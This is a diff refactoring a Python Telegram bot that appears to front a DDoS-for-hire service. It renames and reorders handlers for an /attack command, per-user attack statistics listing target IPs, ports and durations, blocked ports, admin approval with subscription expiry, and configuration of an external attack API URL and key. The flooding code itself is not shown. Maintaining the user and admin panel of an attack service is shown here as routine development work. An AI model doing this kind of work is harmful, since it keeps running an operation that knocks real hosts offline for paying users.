-async def myinfo_command(update: Update, context):
+# Simple user commands (for direct use)
+async def myinfo_cmd(update, context):
     uid = update.effective_user.id
-    user = db.get_user(uid)
-    if not user:
+    u = db.get_user(uid)
+    if not u:
         await update.message.reply_text("Use /start first.")
         return
-    if user.get("approved"):
-        exp = user.get("expires_at")
-        if exp:
-            days = max(0, (make_aware(exp) - get_current_time()).days)
-            expiry = f"{days} days"
-        else:
-            expiry = "Never"
-        await update.message.reply_text(f"✅ Approved\nUser: {uid}\nExpires: {expiry}\nTotal attacks: {user.get('total_attacks',0)}")
+    if u.get("approved"):
+        exp = u.get("expires_at")
+        days = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
+        await update.message.reply_text(f"✅ Approved\nUser: {uid}\nExpires: {days} days\nTotal attacks: {u.get('total_attacks',0)}")
     else:
         await update.message.reply_text("❌ Not approved. Contact admin.")
 
-async def mystats_command(update: Update, context):
+async def mystats_cmd(update, context):
     uid = update.effective_user.id
-    if not await is_user_approved(uid):
+    if not await is_approved(uid):
         await update.message.reply_text("Not approved.")
         return
-    stats = db.get_user_attack_stats(uid)
-    rate = (stats['successful']/stats['total']*100) if stats['total']>0 else 0
-    text = f"Total: {stats['total']}\n✅ {stats['successful']} | ❌ {stats['failed']}\nSuccess rate: {rate:.1f}%"
-    if stats['recent']:
-        text += "\nRecent:\n"
-        for a in stats['recent'][:3]:
+    s = db.get_user_stats(uid)
+    rate = (s['successful']/s['total']*100) if s['total']>0 else 0
+    txt = f"Total: {s['total']}\n✅ {s['successful']} | ❌ {s['failed']}\nSuccess rate: {rate:.1f}%"
+    if s['recent']:
+        txt += "\nRecent:\n"
+        for a in s['recent'][:3]:
             ago = (get_current_time() - a['timestamp']).seconds // 60
-            icon = "✅" if a['status']=="success" else "❌"
-            text += f"{icon} {a['ip']}:{a['port']} - {a['duration']}s ({ago}m ago)\n"
-    await update.message.reply_text(text)
+            txt += f"{'✅' if a['status']=='success' else '❌'} {a['ip']}:{a['port']} - {a['duration']}s ({ago}m ago)\n"
+    await update.message.reply_text(txt)
 
-async def blocked_ports_user_command(update: Update, context):
-    await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}")
+async def blocked_ports_cmd(update, context):
+    await update.message.reply_text(f"🚫 Blocked ports: {blocked_ports_str()}")
 
-async def help_command(update: Update, context):
-    await start_command(update, context)
+async def help_cmd(update, context):
+    await start_cmd(update, context)
 
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def error_handler(update, context):
     logger.error(f"Unhandled error: {context.error}", exc_info=True)
     if update and update.effective_message:
-        # Only send if it's not already handled by attack_command
-        await update.effective_message.reply_text("❌ An unexpected error occurred. Please try again later.")
+        await update.effective_message.reply_text("❌ An unexpected error occurred. Please try again later. Check bot logs for details.")
 
 # ---------- MAIN ----------
 def main():
-    if not BOT_TOKEN:
-        print("❌ BOT_TOKEN missing.")
-        sys.exit(1)
     app = Application.builder().token(BOT_TOKEN).build()
     
     # Conversations
-    approve_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_callback, pattern="^admin_approve$")],
-        states={APPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_user_id)],
-                APPROVE_DAYS: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_user_days)]},
-        fallbacks=[CommandHandler("cancel", cancel_conv)],
-    )
-    disapprove_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_callback, pattern="^admin_disapprove$")],
-        states={DISAPPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, disapprove_user_id)]},
-        fallbacks=[CommandHandler("cancel", cancel_conv)],
-    )
     setapi_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_callback, pattern="^admin_setapi$")],
+        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_setapi$")],
         states={SETAPI_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_url)],
                 SETAPI_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_key)]},
         fallbacks=[CommandHandler("cancel", cancel_conv)],
     )
+    approve_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_approve$")],
+        states={APPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_uid)],
+                APPROVE_DAYS: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_days)]},
+        fallbacks=[CommandHandler("cancel", cancel_conv)],
+    )
+    disapprove_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_disapprove$")],
+        states={DISAPPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, disapprove_uid)]},
+        fallbacks=[CommandHandler("cancel", cancel_conv)],
+    )
     
-    # Command handlers
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("attack", attack_command))
-    app.add_handler(CommandHandler("myinfo", myinfo_command))
-    app.add_handler(CommandHandler("mystats", mystats_command))
-    app.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
-    app.add_handler(CommandHandler("help", help_command))
+    # Register handlers
+    app.add_handler(CommandHandler("start", start_cmd))
+    app.add_handler(CommandHandler("attack", attack_cmd))
+    app.add_handler(CommandHandler("myinfo", myinfo_cmd))
+    app.add_handler(CommandHandler("mystats", mystats_cmd))
+    app.add_handler(CommandHandler("blockedports", blocked_ports_cmd))
+    app.add_handler(CommandHandler("help", help_cmd))
     
-    # Callback queries (non-conversation)
-    app.add_handler(CallbackQueryHandler(button_callback, pattern="^(attack_menu|myinfo|mystats|myattacks|blockedports|help|admin_panel|back_main|admin_users|admin_stats|admin_status|admin_running|admin_blockedports)$"))
+    # Button callbacks (non-conversation)
+    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(attack_menu|myinfo|mystats|blockedports|help|admin_panel|back_main|admin_users|admin_stats|admin_status|admin_blockedports)$"))
     
     # Conversation handlers
+    app.add_handler(setapi_conv)
     app.add_handler(approve_conv)
     app.add_handler(disapprove_conv)
-    app.add_handler(setapi_conv)
     
     app.add_error_handler(error_handler)
     
     print("🤖 Bot started. Admins:", ADMIN_IDS)
-    api_url, _ = db.get_api_config()
-    print(f"🌐 Current API URL: {api_url or 'Not set'}")
+    url, _ = db.get_api_config()
+    print(f"🌐 API URL: {url if url else 'Not set'}")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
